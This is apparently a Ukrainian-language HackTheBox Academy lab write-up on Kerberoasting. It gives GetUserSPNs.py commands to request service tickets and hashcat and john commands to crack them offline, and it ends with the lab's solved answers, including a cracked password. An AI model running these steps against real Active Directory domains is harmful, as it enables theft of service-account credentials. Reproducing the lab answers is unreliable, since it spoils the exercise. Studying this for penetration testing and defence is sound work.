```markdown
# Kerberoasting - from Linux

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1274](https://academy.hackthebox.com/app/module/143/section/1274) |

***

## 🔑 Ключові команди

### Що таке Kerberoasting?
Kerberoasting — атака на Kerberos, яка дозволяє будь-якому доменному користувачу
запросити TGS тікет для акаунту з SPN (Service Principal Name). Тікет зашифрований
NTLM хешем сервісного акаунту, тому його можна зламати офлайн через brute-force.

### Крок 1 — Знайти акаунти з SPN (Kerberoastable)
```bash
# Переглянути всі акаунти з SPN в домені
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<user>:<password>

# Приклад
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2
```

### Крок 2 — Отримати TGS тікет (hash) для конкретного акаунту
```bash
# Запросити тікет і зберегти у файл для офлайн крекінгу
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<user>:<password> \
  -request-user <target_user> -outputfile <output.hash>

# Приклад
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -request-user SAPService -outputfile sapservice.hash
```

### Крок 3 — Зламати hash офлайн через hashcat
```bash
# Тип хешу 13100 = Kerberos TGS-REP (etype 23)
hashcat -m 13100 <hash_file> /usr/share/wordlists/rockyou.txt
hashcat -m 13100 <hash_file> /usr/share/wordlists/rockyou.txt --force
```

### Крок 3 (альтернатива) — Зламати через john
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <hash_file>

# Переглянути результат
john --show <hash_file>
```

### Перевірити членство в групах сервісного акаунту
```bash
# Видно у виводі GetUserSPNs.py в колонці MemberOf
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 | grep -i <username>
```

***

## 🧪 Практика

### Середовище

| Параметр | Значення |
|----------|----------|
| Attack Host | `10.129.x.x` (ACADEMY-EA-ATTACK01) |
| SSH | `htb-student` / `HTB_@cademy_stdnt!` |
| DC | `172.16.5.5` (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL) |
| Domain creds | `forend` / `Klmcargo2` |

### Q1 — Retrieve the TGS ticket for SAPService. Crack it and submit the password.

```bash
# Крок 1 — Отримати TGS тікет
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -request-user SAPService -outputfile sapservice.hash

# Крок 2 — Зламати через john
john --wordlist=/usr/share/wordlists/rockyou.txt sapservice.hash
```

```
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23)
!SapperFi2       (?)
Session completed
```

✅ **Відповідь: `!SapperFi2`**

***

### Q2 — What powerful local group on the DC is the SAPService user a member of?

```bash
# Видно у виводі GetUserSPNs.py в колонці MemberOf
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 | grep -i sap
```

```
SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
```

> Account Operators — привілейована група, члени якої можуть створювати/змінювати
> більшість об'єктів AD, що робить цей акаунт дуже небезпечним при компрометації.

✅ **Відповідь: `Account Operators`**
```
